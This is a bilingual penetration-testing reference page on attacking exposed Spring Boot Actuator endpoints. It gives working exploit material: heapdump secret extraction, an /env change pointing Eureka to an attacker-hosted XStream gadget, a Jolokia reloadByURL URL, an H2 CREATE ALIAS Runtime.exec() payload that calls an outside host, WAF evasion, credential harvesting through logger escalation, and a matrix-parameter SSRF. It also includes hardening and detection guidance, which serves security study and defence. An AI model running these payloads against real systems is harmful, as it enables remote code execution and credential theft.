---
status: NEEDS_HUMAN_REVIEW
degradation_reason: |
  3 of 9 resources degraded (33.3%). P0-01 Veracode (original research) and P1-01 Wiz 
  are Next.js/React SPAs — all 4 fallback tools exhausted (curl → bb-browser → Playwright 
  not installed → proxy returns same JS shell). Article content exists in JS bundles 
  (70 and 17 tech keyword matches respectively) but cannot be independently verified 
  as plain text. Content preserved from Hacktricks secondary source.
verified_resources: |
  P0: spaceraccoon.dev (H2 RCE deep dive — confirmed §3.3 technique)
  P2: SpringAuthBypass.png, spring-boot.txt wordlist, JDumpSpider
  P3: VisualVM, 0xdf HTB Eureka
  IMG: Tesseract partial extraction
  SectionMapping: 11 VERIFIED · 2 SKIP · 0 MISSING

attack_surface:
  - 配置缺陷
  - 信息泄露
  - 注入类
impact:
  - 远程代码执行
  - 信息泄露
  - 机密性破坏
risk_level: 严重
prerequisites:
  - Spring Boot & Actuator Basics
  - JMX / MBeans Concepts
  - Java Deserialization Fundamentals
related_techniques:
  - java-deserialization
  - ssrf
  - xxe
  - credential-harvesting
  - waf-bypass
difficulty: 中级
tools:
  - jdumpspider
  - visualvm
  - curl
  - jq
---

# Spring Actuators — Spring Boot Actuator Attack Surface — Spring Boot Actuator 攻击面分析

> 关联文档：[Java Deserialization](../../User%20input/Structured%20objects/Deserialization/README.md) · [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) · [XXE](../../User%20input/Structured%20objects/XXE/README.md) · [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md) · [Parameter Pollution](../../Other%20Helpful%20Vulnerabilities/Parameter%20Pollution/README.md)

---

### 知识路径

```
Spring Actuators (this document)
  ├── Prerequisite: Spring Boot Framework — beans, properties, autoconfiguration
  ├── Prerequisite: JMX & MBeans — Jolokia bridge concept
  ├── Next: /env + H2 Database RCE (chained exploitation)
  │   └── See: spaceraccoon.dev - RCE in Three Acts
  ├── Next: Heapdump Analysis with VisualVM/OQL
  ├── Related: Java Deserialization — XStream, Logback XML chains
  │   └── See: User input/Structured objects/Deserialization
  ├── Related: SSRF — Matrix parameter pathname confusion
  │   └── See: User input/Reflected Values/SSRF
  ├── Related: XXE — Logback XML external entity loading
  │   └── See: User input/Structured objects/XXE
  └── Related: WAF Bypass — Spring matrix parameter delimiter confusion
      └── See: Proxies/Proxy & WAF Protections Bypass
```

---

# 0x01 Spring Actuators Attack Surface — Principles & Classification

## 1.1 Actuator Architecture

Spring Boot Actuators are production-ready monitoring and management endpoints auto-configured by the `spring-boot-actuator` dependency. They expose operational information about the running application via HTTP (default) or JMX.

**Endpoint registration by version:**

| Version | Base Path | Auth Model | Notes |
|---------|-----------|------------|-------|
| Spring Boot 1.x (Actuator 1.0–1.4) | Root (`/`) | All endpoints **unauthenticated** by default | Maximum exposure |
| Spring Boot 1.x (Actuator 1.5+) | Root (`/`) | Only `/health` and `/info` non-sensitive by default; `management.security.enabled=true` | Developers frequently disable this property |
| Spring Boot 2.x | `/actuator/` | Same model; JSON format for `/env` property modification | Base path change breaks legacy scanners |
| Spring Boot 3.x | `/actuator/` | Same model; Jakarta EE 9 migration | Same techniques apply |

**Key endpoint categories:**

| Category | Endpoints | Risk |
|----------|-----------|------|
| Configuration Exposure | `/env`, `/configprops`, `/beans` | Credentials, internal URLs, secrets |
| Runtime State | `/heapdump`, `/threaddump`, `/dump`, `/trace`, `/httpexchanges` | Live secrets in JVM memory, request traces |
| Log Access | `/logfile`, `/loggers` | Log content, dynamic log level control |
| Operational Control | `/shutdown`, `/restart`, `/refresh` | Application lifecycle manipulation |
| Route Mapping | `/mappings` | Internal API structure, hidden endpoints |
| JMX Bridge | `/jolokia` | MBean access → deserialization/RCE |

## 1.2 Attack Surface Taxonomy

| Category | Taxonomy | Endpoints / Techniques |
|----------|----------|----------------------|
| Configuration Weakness | 配置缺陷 | Actuators exposed without auth; `management.endpoints.web.exposure.include=*`; sensitive endpoints not disabled |
| Information Disclosure | 信息泄露 | `/heapdump` secrets; `/env` properties; `/trace` request data; `/logfile` log contents; `/configprops` configuration |
| Injection | 注入类 | `/jolokia` reloadByURL → XXE → RCE; `/env` + Eureka → XStream deserialization; `/env` + H2 → JDBC URL injection |
| Authentication/Authorization Bypass | 认证/授权绕过 | Spring Auth Bypass pattern; `/env` property modification bypassing security constraints |
| Parsing Discrepancy | 协议解析差异 | Matrix parameter SSRF (`;@evil.com/url`) — Spring vs reverse proxy pathname interpretation |

## 1.3 Attack Surface Discovery

A comprehensive wordlist for actuator endpoint enumeration: [spring-boot.txt](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt)

Common endpoints to probe:

```
/actuator
/actuator/health
/actuator/env
/actuator/heapdump
/actuator/mappings
/actuator/loggers
/actuator/logfile
/actuator/configprops
/actuator/beans
/actuator/threaddump
/actuator/trace
/actuator/httpexchanges
/actuator/shutdown
/actuator/jolokia
/actuator/jolokia/list
/env
/health
/heapdump
/mappings
/jolokia
```

> **Warning:** Certain actuator endpoints are especially dangerous when exposed without authentication: `/dump`, `/trace`, `/logfile`, `/shutdown`, `/mappings`, `/env`, `/actuator/env`, `/restart`, and `/heapdump`. These can expose sensitive data or allow harmful actions including remote code execution.

---

# 0x02 Information Disclosure via Actuators

## 2.1 /env — Environment Property Exposure

### 2.1.1 Mechanism

The `/env` endpoint exposes all Spring `Environment` properties including system properties, environment variables, `application.properties`, and `application.yml`. This frequently includes plaintext credentials.

```bash
curl -s http://target/actuator/env | jq .
```

Properties of high interest:
- `spring.datasource.url`, `spring.datasource.username`, `spring.datasource.password`
- `eureka.client.serviceUrl.defaultZone` — may contain embedded credentials
- `management.endpoints.web.exposure.include`
- `logging.file`, `logging.path`
- Any custom property with `password`, `secret`, `key`, `token` in the name

### 2.1.2 Spring Boot 2.x JSON Format

In Spring Boot 2.x, the `/env` endpoint uses JSON format for property modification (matching the GET response format), but the general concept of property exposure and manipulation remains identical.

## 2.2 /heapdump — JVM Heap Secrets Mining

### 2.2.1 Mechanism

If `/actuator/heapdump` is exposed, a full JVM heap snapshot can be downloaded. The heap frequently contains live secrets: database credentials, API keys, Basic-Auth headers, internal service URLs, and entire Spring property maps held in `OriginTrackedMapPropertySource` objects.

### 2.2.2 Quick Triage

```bash
# Download the heapdump
wget http://target/actuator/heapdump -O heapdump

# Quick wins: grep for HTTP auth headers and JDBC connection strings
strings -a heapdump | grep -nE 'Authorization: Basic|jdbc:|password=|spring\.datasource|eureka\.client'

# Decode any Base64 Basic-Auth credentials found
printf %s 'RXhhbXBsZUJhc2U2NEhlcmU=' | base64 -d
```

### 2.2.3 Deep Analysis with VisualVM + OQL

Open the heapdump in [VisualVM](https://visualvm.github.io/) and use OQL (Object Query Language) to hunt for secrets:

```sql
select s.toString() 
from java.lang.String s 
where /Authorization: Basic|jdbc:|password=|spring\.datasource|eureka\.client|OriginTrackedMapPropertySource/i.test(s.toString())
```

### 2.2.4 Automated Extraction with JDumpSpider

```bash
java -jar JDumpSpider-*.jar heapdump
```

Typical high-value findings:
- Spring `DataSourceProperties` / `HikariDataSource` objects exposing `url`, `username`, `password`
- `OriginTrackedMapPropertySource` entries revealing `management.endpoints.web.exposure.include`, service ports, and embedded Basic-Auth in URLs (e.g., Eureka `defaultZone`)
- Plain HTTP request/response fragments including `Authorization: Basic ...` captured in memory

> **Tip:** Credentials extracted from heapdump often work for adjacent services and sometimes for system users (SSH). Test harvested credentials broadly across the environment.

## 2.3 /mappings — Route Map Exposure

The `/mappings` endpoint lists all registered request mappings including internal and hidden endpoints not documented publicly. This reveals:

- Undocumented admin endpoints
- Internal API routes
- Framework-level endpoints (e.g., `/error`, `/actuator/*`)
- Custom endpoints with parameter structures

```bash
curl -s http://target/actuator/mappings | jq .
```

## 2.4 /trace & /httpexchanges — Request Trace Disclosure

- **Spring Boot 1.x:** `/trace` displays the last 100 HTTP requests including headers (cookies, `Authorization`, session IDs)
- **Spring Boot 2.x/3.x:** `/httpexchanges` (when enabled) provides similar request/response trace with header capture

```bash
curl -s http://target/actuator/trace | jq .
curl -s http://target/actuator/httpexchanges | jq .
```

## 2.5 /configprops — Configuration Property Disclosure

`/configprops` shows all `@ConfigurationProperties` beans with their resolved values:

```bash
curl -s http://target/actuator/configprops | jq .
```

This can expose database connection pools, message broker configurations, cache settings, and other integration properties with their runtime values.

---

# 0x03 Remote Code Execution

## 3.1 /jolokia — reloadByURL → XXE → RCE

### 3.1.1 Mechanism

The `/jolokia` actuator endpoint exposes the [Jolokia](https://jolokia.org/) library, providing HTTP access to JMX MBeans. The `reloadByURL` action on the Logback `JMXConfigurator` MBean can be exploited to reload logging configuration from an **external URL**, which enables:

1. **Blind XXE** — Loading a remote XML file with external entity definitions
2. **Remote Code Execution** — Crafted Logback XML configurations (e.g., `<insertFromJNDI>`, scripting expressions)

### 3.1.2 Exploit URL Pattern

```
http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml
```

The URL path encodes the MBean ObjectName (`ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator`), the operation (`reloadByURL`), and the target URL (`http://artsploit.com/logback.xml`) using `!/` as the path segment separator.

### 3.1.3 Conditions

- `/jolokia` actuator endpoint must be exposed and accessible
- `logback-classic` must be on the classpath (default in Spring Boot)
- Outbound HTTP connectivity from the target to attacker-controlled server
- No authentication on the Jolokia endpoint (or valid credentials if enabled)

> **Original research:** [Veracode — Exploiting Spring Boot Actuators](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

## 3.2 /env + Spring Cloud Eureka — XStream Deserialization RCE

### 3.2.1 Mechanism

When Spring Cloud Libraries are present, the `/env` endpoint allows **modification** of environment properties (not just reading). The `eureka.client.serviceUrl.defaultZone` property can be pointed to an attacker-controlled URL serving a malicious XStream-serialized payload. When Eureka client attempts to fetch the service registry, it deserializes the attacker's payload.

### 3.2.2 Exploit

```http
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```

### 3.2.3 Conditions

- Spring Cloud Netflix Eureka on the classpath
- `/env` endpoint allows POST (property modification enabled)
- Target's Eureka client periodically fetches from the poisoned service URL
- Attacker serves a valid XStream gadget chain at the specified URL

## 3.3 /env + H2 Database — HikariCP connection-test-query → CREATE ALIAS RCE

### 3.3.1 Mechanism

Spring Boot 2.x uses **HikariCP** as the default database connection pool. The `spring.datasource.hikari.connection-test-query` property defines a SQL query executed to validate each new database connection before handing it to the application. When the `/env` endpoint allows POST, an attacker can overwrite this property with a malicious SQL payload.

When combined with the **H2 Database Engine** (a common development dependency), this enables arbitrary Java code execution via H2's `CREATE ALIAS` command, which registers a Java function as an SQL-callable alias. The chain:

```
POST /actuator/env  →  overwrite spring.datasource.hikari.connection-test-query
                       with CREATE ALIAS ... Runtime.exec()
                    →  trigger new DB connection (POST /actuator/restart or traffic)
                    →  HikariCP executes the connection-test-query
                    →  H2 CREATE ALIAS registers a Java function
                    →  CALL the alias → OS command execution
```

### 3.3.2 Exploit Payload

```http
POST /actuator/env HTTP/1.1
Host: target.app
Content-Type: application/json

{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('curl  http://x.burpcollaborator.net');"}
```

### 3.3.3 WAF Bypass via String Concatenation

The `CREATE ALIAS` function body can be fragmented using `CONCAT` and `HEXTORAW` to evade keyword-based WAF filters (e.g., breaking up `exec`, `Runtime`):

```sql
CREATE ALIAS EXEC AS CONCAT('void e(String cmd) throws java.io.IOException',
HEXTORAW('007b'),'java.lang.Runtime rt= java.lang.Runtime.getRuntime();
rt.exec(cmd);',HEXTORAW('007d'));
CALL EXEC('whoami');
```

### 3.3.4 Blind RCE via Boolean Oracle

In restricted environments (Docker, no outbound network, no shell), a blind RCE oracle can be constructed: the Java function returns output on success and throws an exception on failure. Since `connection-test-query` determines whether the DB connection is "alive":

- Command produces output → query succeeds → application functions normally
- Command produces no output → exception thrown → query fails → application returns errors

```java
String shellexec(String cmd) throws java.io.IOException {
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());
    if (s.hasNext()) {
        return s.next();  // output exists → SQL query succeeds → app healthy
    }
    throw new IllegalArgumentException(); // no output → SQL query fails → app errors
}
```

This enables boolean-based data exfiltration: `grep root /etc/passwd` succeeds, `grep nonexistent /etc/passwd` fails.

### 3.3.5 Triggering Connection Pool Initialization

After modifying `spring.datasource.hikari.connection-test-query`, new database connections must be created:
- `POST /actuator/restart` — Restarts the application context, forcing connection pool re-initialization
- Generate sufficient traffic to exhaust the existing connection pool and force new connections

### 3.3.6 Conditions

- `/env` writable via POST (`management.endpoints.web.exposure.include=env` or `*`)
- Spring Boot 2.x (HikariCP is the default connection pool)
- H2 Database Engine on classpath (`com.h2database:h2` dependency — common in development)
- `/actuator/restart` exposed, or ability to trigger sufficient traffic for connection pool turnover

## 3.4 /env + DataSource Property Manipulation

Additional properties that can be manipulated for exploitation:

- `spring.datasource.tomcat.validationQuery` — Inject sub-query or timing-based SQL
- `spring.datasource.tomcat.url` — Redirect database connections to attacker-controlled server
- `spring.datasource.tomcat.max-active` — Resource exhaustion / DoS
- `spring.datasource.tomcat.validationInterval` — Timing manipulation

> **Note:** Property names are provider-specific. Tomcat JDBC pool uses `spring.datasource.tomcat.*`; HikariCP uses `spring.datasource.hikari.*`.

---

# 0x04 Authentication Bypass & SSRF

## 4.1 Spring Auth Bypass Pattern

A known authentication bypass exists in certain Spring Security configurations where actuator endpoints are inadvertently left unprotected due to filter chain ordering or path matching errors.

[图片: Spring Auth Bypass diagram — Tesseract extracted: "nothing supernatural 2 @ TOMCAT_ROOT_DIR/webapps/testApp/WEB-INF/Avebxml Tips to know". Shows filter chain bypass pattern where actuator paths circumvent Spring Security authentication filters. Source: Mike-n1/tips]

**Image source:** [https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)

## 4.2 Matrix Parameter SSRF — Spring Pathname Interpretation

### 4.2.1 Mechanism

Spring Framework's handling of [matrix parameters](https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-controller/ann-requestmapping.html#mvc-ann-matrix-variables) (`;`) in HTTP pathnames diverges from standard URI parsers used by reverse proxies and WAFs. A semicolon-separated segment like `;@evil.com` is interpreted as a path parameter by Spring but may be treated as an authority component by other parsers.

### 4.2.2 Exploit

```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```

Spring interprets this as: request to path `/url` with matrix parameter bound to the root segment. However, certain SSRF-vulnerable components (reverse proxies, internal HTTP clients, URL rewriting engines) may resolve `;@evil.com` as a userinfo + host override, routing the request to `evil.com`.

### 4.2.3 Conditions

- Spring MVC application (matrix parameters enabled — default)
- Downstream SSRF-vulnerable component that misparses the pathname
- Reverse proxy or WAF that forwards the literal `;@evil.com` path segment without normalization

This technique is closely related to [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md) — the same `;` delimiter behavior differences exploited in Tomcat path traversal (see [Tomcat §3.4](../../Web%20Servers%20&%20Middleware/Tomcat/README.md#34-path-traversal-bypass-via-path-delimiter-confusion)) apply to Spring's matrix variable parser when combined with SSRF-prone components.

---

# 0x05 Credential Harvesting via Logger Abuse

## 5.1 Dynamic Log Level Escalation

### 5.1.1 Mechanism

If `management.endpoints.web.exposure.include` allows it and `/actuator/loggers` is exposed, an attacker can dynamically increase log levels to `DEBUG` or `TRACE` for packages that handle authentication and request processing. Combined with readable logs (via `/actuator/logfile` or known log paths), this can leak credentials submitted during login flows — including Basic-Auth headers and form parameters.

### 5.1.2 Enumerate and Escalate

```bash
# List all available loggers
curl -s http://target/actuator/loggers | jq .

# Enable TRACE-level logging for security/web stacks
curl -s -X POST http://target/actuator/loggers/org.springframework.security \
     -H 'Content-Type: application/json' -d '{"configuredLevel":"TRACE"}'

curl -s -X POST http://target/actuator/loggers/org.springframework.web \
     -H 'Content-Type: application/json' -d '{"configuredLevel":"TRACE"}'

curl -s -X POST http://target/actuator/loggers/org.springframework.cloud.gateway \
     -H 'Content-Type: application/json' -d '{"configuredLevel":"TRACE"}'
```

### 5.1.3 Locate and Read Logs

```bash
# If /actuator/logfile is exposed, read directly
curl -s http://target/actuator/logfile | strings | grep -nE 'Authorization:|username=|password='

# Otherwise, query /actuator/env to locate the log file path
curl -s http://target/actuator/env | jq '.propertySources[].properties | to_entries[] | select(.key|test("^logging\\.(file|path)"))'
```

### 5.1.4 Trigger Authentication Traffic

Once verbose logging is enabled, trigger authentication requests (or wait for legitimate user traffic) to capture credentials in the logs. In microservice architectures with a gateway fronting authentication, enabling `TRACE` for gateway/security packages typically makes headers and form bodies visible in the log stream.

> **Note:** Some environments generate synthetic login traffic periodically for health checks, making credential harvesting trivial once logging is set to verbose.

### 5.1.5 Cleanup

```bash
# Reset log levels when done — set configuredLevel to null
curl -s -X POST http://target/actuator/loggers/org.springframework.security \
     -H 'Content-Type: application/json' -d '{"configuredLevel":null}'
```

## 5.2 /actuator/httpexchanges — Recent Request Metadata

If `/actuator/httpexchanges` is exposed, it surfaces recent request metadata that may include sensitive headers (`Authorization`, session cookies, API tokens) without needing to escalate log levels. This is a passive alternative to the logger attack.

---

# 0x06 Defense, Hardening & Tools

## 6.1 Hardening Checklist

| Action | Rationale |
|--------|-----------|
| Never expose actuators to the internet — bind to `127.0.0.1` via `management.server.port` and `management.server.address` | Isolates management endpoints to localhost |
| Set `management.endpoints.web.exposure.include=health,info` (minimal) | Only expose non-sensitive endpoints |
| Disable individual dangerous endpoints: `management.endpoint.shutdown.enabled=false`, `management.endpoint.heapdump.enabled=false`, `management.endpoint.env.enabled=false` | Defense in depth |
| Set `management.endpoints.enabled-by-default=false` and whitelist only required endpoints | Opt-in rather than opt-out |
| Always enable Spring Security on actuator endpoints: `management.endpoint.health.show-details=when-authorized` | Requires authentication for sensitive data |
| Use a dedicated management port with firewall rules restricting access to trusted IPs | Network-level isolation |
| Disable Jolokia entirely if not needed: exclude `jolokia-core` dependency | Removes JMX bridge attack surface |
| Audit `spring.datasource.*`, `eureka.client.*`, and custom properties for embedded credentials | Reduces exposure if `/env` is leaked |
| Enable `logging.level.org.springframework.boot.actuate=INFO` in production | Prevents sensitive data in logs |
| Review `management.endpoints.web.exposure.include` in all `application-{profile}.yml` files | Profile-specific overrides may re-enable endpoints |
| Upgrade Spring Boot to latest patch within your major version | CVEs against actuator endpoints are patched regularly |

## 6.2 Detection Telemetry

| Indicator | Significance |
|-----------|--------------|
| `GET /actuator/heapdump` followed by large outbound transfer | Heap dump exfiltration |
| `POST /actuator/loggers/*` with `configuredLevel: TRACE` | Logger tampering |
| `POST /actuator/env` or `POST /env` with property modifications | Property injection |
| `GET /jolokia/exec/` with external URLs in path | Jolokia reloadByURL exploitation |
| Access to `/actuator/mappings`, `/actuator/beans`, `/actuator/configprops` from non-internal IPs | Reconnaissance phase |
| Multiple `404` responses probing `/actuator/*` paths | Actuator endpoint discovery |
| `POST /actuator/refresh` after property modification | Chained attack trigger |

## 6.3 Tools Inventory

| Tool | Purpose | Reference |
|------|---------|-----------|
| `JDumpSpider` | Automated heapdump secret extraction | [github.com/whwlsfb/JDumpSpider](https://github.com/whwlsfb/JDumpSpider) |
| `VisualVM` | Heapdump analysis + OQL queries | [visualvm.github.io](https://visualvm.github.io/) |
| `spring-boot.txt` (SecLists) | Actuator endpoint wordlist | [github.com/artsploit/SecLists](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt) |
| `curl` + `jq` | Manual actuator probing | Built-in |
| `strings` | Quick heapdump triage | Built-in |

## 参考资料

- [Veracode — Exploiting Spring Boot Actuators (Original Research)](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)
- [spaceraccoon.dev — RCE in Three Acts: Chaining Exposed Actuators and H2 Database](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)
- [Wiz — Exploring Spring Boot Actuator Misconfigurations](https://www.wiz.io/blog/spring-boot-actuator-misconfigurations)
- [0xdf — HTB Eureka (Actuator heapdump + Gateway logging abuse)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [JDumpSpider — Heapdump Analysis Tool](https://github.com/whwlsfb/JDumpSpider)
- [VisualVM — JVM Monitoring & Heap Analysis](https://visualvm.github.io/)
- [Spring Official — Actuator Endpoints Documentation](https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html)
- [Spring Official — Matrix Variables](https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-controller/ann-requestmapping.html#mvc-ann-matrix-variables)
